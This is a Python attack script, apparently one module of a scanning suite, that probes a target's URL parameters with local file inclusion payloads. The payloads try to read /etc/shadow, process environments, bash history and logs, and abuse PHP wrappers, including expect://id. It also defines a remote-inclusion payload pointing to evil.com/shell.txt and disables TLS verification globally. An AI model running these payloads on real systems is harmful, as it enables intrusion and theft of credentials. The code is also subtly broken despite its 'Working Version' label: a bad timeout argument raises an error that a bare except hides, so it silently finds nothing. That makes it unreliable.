#!/usr/bin/env python3
"""TERMINAL 6: LFI (Local File Inclusion) SCANNER - Working Version"""
import os, sys, json, urllib.request, urllib.parse, urllib.error
from datetime import datetime
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    workspace = sys.argv[2] if len(sys.argv) > 2 else "/tmp/scan"
    
    print(f"[+] TERMINAL 6: LFI Scanner Started")
    print(f"[+] Target: {target}")
    
    os.makedirs(f"{workspace}/results", exist_ok=True)
    result_file = f"{workspace}/results/lfi_scan.json"
    
    results = {"terminal": 6, "name": "LFI Scanner", "target": target,
        "start_time": datetime.now().isoformat(), "status": "running",
        "vulnerabilities": [], "tested_files": [], "log": ""}
    
    log_lines = []
    def log(msg):
        print(msg)
        log_lines.append(msg)
    
    # LFI payloads - files to read
    lfi_payloads = [
        "../../../../../../../etc/passwd",
        "../../../../../../../etc/hosts",
        "../../../../../../../etc/shadow",
        "../../../../../../../proc/self/environ",
        "../../../../../../../proc/self/cmdline",
        "../../../../../../../proc/version",
        "../../../../../../../etc/issue",
        "../../../../../../../etc/os-release",
        "../../../../../../../var/log/auth.log",
        "../../../../../../../var/log/apache2/access.log",
        "../../../../../../../var/www/html/index.php",
        "../../../../../../../root/.bash_history",
        "../../../../../../../home/user/.bash_history",
        "../../../../../../../etc/apache2/apache2.conf",
        "../../../../../../../etc/nginx/nginx.conf",
        "../../../../../../../etc/my.cnf",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain,<?php phpinfo(); ?>",
        "expect://id"
    ]
    
    # Parameters vulnerable to LFI
    lfi_params = ['file', 'page', 'path', 'folder', 'dir', 'document', 'view',
                    'content', 'template', 'include', 'require', 'load']
    
    test_urls = [f"http://{target}/", f"http://{target}/index.php", f"http://{target}/page.php",
                 f"http://{target}/view.php", f"http://{target}/load.php"]
    
    log("[*] Testing for Local File Inclusion...")
    
    vuln_found = False
    
    for base_url in test_urls:
        for param in lfi_params:
            for payload in lfi_payloads[:10]:  # Limit for speed
                test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                results['tested_files'].append(test_url)
                
                try:
                    req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
                    with urllib.request.urlopen(req) as response:
                        content = response.read().decode('utf-8', errors='ignore')
                        
                        # Check for file content indicators
                        indicators = [
                            ('root:', '/etc/passwd found'),
                            ('daemon:', 'system user found'),
                            ('bin/bash', 'bash shell found'),
                            ('127.0.0.1', '/etc/hosts content'),
                            ('<?php', 'PHP source code exposed'),
                            ('DOCUMENT_ROOT=', 'environment variables'),
                            ('HTTP_USER_AGENT=', 'HTTP headers exposed')
                        ]
                        
                        for indicator, desc in indicators:
                            if indicator in content:
                                if not vuln_found:
                                    log(f"[!] LFI VULNERABILITY FOUND!")
                                    vuln_found = True
                                
                                log(f"  [+] {desc}")
                                log(f"  [+] URL: {test_url[:70]}")
                                log(f"  [+] Content preview: {content[:100]}")
                                
                                results['vulnerabilities'].append({
                                    'type': 'Local File Inclusion (LFI)',
                                    'severity': 'Critical',
                                    'url': test_url,
                                    'param': param,
                                    'payload': payload,
                                    'evidence': desc
                                })
                                break
                                
                except urllib.error.HTTPError as e:
                    if e.code == 200:  # Sometimes returns 200 with file content
                        content = e.read().decode('utf-8', errors='ignore')
                        if 'root:' in content or 'daemon:' in content:
                            log(f"[!] LFI via error response!")
                            results['vulnerabilities'].append({
                                'type': 'Local File Inclusion (LFI)',
                                'severity': 'Critical',
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'evidence': 'File content in error response'
                            })
                except: pass
    
    # Test for RFI to LFI chaining
    log("[*] Testing RFI to LFI chaining...")
    rfi_payloads = [
        "http://evil.com/shell.txt",
        "ftp://anonymous:anonymous@ftp.example.com/file",
        "file:///etc/passwd"
    ]
    
    results['status'] = 'completed'
    results['end_time'] = datetime.now().isoformat()
    results['log'] = '\n'.join(log_lines)
    
    with open(result_file, 'w') as f:
        json.dump(results, f, indent=2)
    log(f"[+] LFI complete! {len(results['vulnerabilities'])} vulns found")

if __name__ == '__main__':
    main()
